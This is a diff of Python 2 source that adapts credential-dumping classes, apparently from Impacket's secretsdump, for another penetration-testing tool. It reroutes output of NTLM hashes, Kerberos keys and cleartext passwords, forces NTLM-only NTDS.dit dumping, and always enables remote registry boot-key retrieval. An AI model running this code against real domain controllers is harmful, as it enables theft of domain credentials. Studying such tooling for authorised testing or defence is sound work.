@@ -1694,7 +1694,7 @@ class NTDSHashes:
 
             if self.__pwdLastSet is True:
                 answer = "%s (pwdLastSet=%s)" % (answer, pwdLastSet)
-            print answer
+            print_att(answer)
 
             if self.__history:
                 for i, (LMHashHistory, NTHashHistory) in enumerate(
@@ -1705,7 +1705,7 @@ class NTDSHashes:
                         lmhash = hexlify(LMHashHistory)
 
                     answer = "%s_history%d:%s:%s:%s:::" % (userName, i, rid, lmhash, hexlify(NTHashHistory))
-                    print answer
+                    print_att(answer)
                     if outputFile is not None:
                         self.__writeOutput(outputFile, answer + '\n')
 
@@ -1888,7 +1888,7 @@ class NTDSHashes:
                 logging.info('Kerberos keys grabbed')
 
             for itemKey in self.__kerberosKeys.keys():
-                print itemKey
+                print_att(itemKey)
 
         # And finally the cleartext pwds
         if len(self.__clearTextPwds) > 0:
@@ -1898,7 +1898,7 @@ class NTDSHashes:
                 logging.info('ClearText passwords grabbed')
 
             for itemKey in self.__clearTextPwds.keys():
-                print itemKey
+                print_att(itemKey)
 
         # Closing output file
         if self.__outputFileName is not None:
@@ -1940,14 +1940,14 @@ class DumpSecrets:
         self.__securityHive = None #Local
         self.__samHive = None #Local
         self.__ntdsFile = None #Local
-        self.__history = False #Might want to expose this
+        #self.__history = False #Might want to expose this
         self.__noLMHash = True
         self.__isRemote = True
         self.__outputFileName = outputFile
         self.__doKerberos = kerberos
         self.__justDC = False #Might want to expose this
-        self.__justDCNTLM = False #Might want to expose this
-        self.__pwdLastSet = False #Might want to expose this
+        self.__justDCNTLM = True #Might want to expose this
+        #self.__pwdLastSet = False #Might want to expose this
         self.__resumeFileName = None #Might want to expose this
 
     def getBootKey(self):
@@ -1998,12 +1998,10 @@ class DumpSecrets:
     def do_remote_ops(self):
         bootKey = None
         self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos)
-        if self.__justDC is False and self.__justDCNTLM is False or self.__useVSSMethod is True:
-            self.__remoteOps.enableRegistry()
-            bootKey = self.__remoteOps.getBootKey()
-            # Let's check whether target system stores LM Hashes
-            self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
-
+        self.__remoteOps.enableRegistry()
+        bootKey = self.__remoteOps.getBootKey()
+        # Let's check whether target system stores LM Hashes
+        self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
         self.__bootKey = bootKey
 
     def dump_SAM(self):
@@ -2035,7 +2033,7 @@ class DumpSecrets:
             except Exception, e:
                 logging.error('LSA hashes extraction failed: %s' % str(e))
 
-    def dump_NTDS(self, method):
+    def dump_NTDS(self, method, history, pwdLastSet):
         # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work
         vss = False
         if method == 'vss':
@@ -2044,17 +2042,18 @@ class DumpSecrets:
         else:
             NTDSFileName = None
 
-        self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote=True, history=self.__history,
+        print_succ("{}:{} Dumping NTDS.dit secrets using the {} method (domain\\uid:rid:lmhash:nthash):".format(self.__remoteAddr, self.__remotePort, method.upper()))
+        self.__NTDSHashes = NTDSHashes(NTDSFileName, self.__bootKey, isRemote=True, history=history,
                                        noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,
                                        useVSSMethod=vss, justNTLM=self.__justDCNTLM,
-                                       pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,
+                                       pwdLastSet=pwdLastSet, resumeSession=self.__resumeFileName,
                                        outputFileName=self.__outputFileName)
         try:
             self.__NTDSHashes.dump()
         except Exception, e:
             logging.error(e)
             if method != 'vss':
-                logging.info('Something wen\'t wrong with the DRSUAPI approach. Try again with -use-vss parameter')
+                logging.info('Something wen\'t wrong with the DRSUAPI approach')
 
     def cleanup(self):
         logging.info('Cleaning up... ')
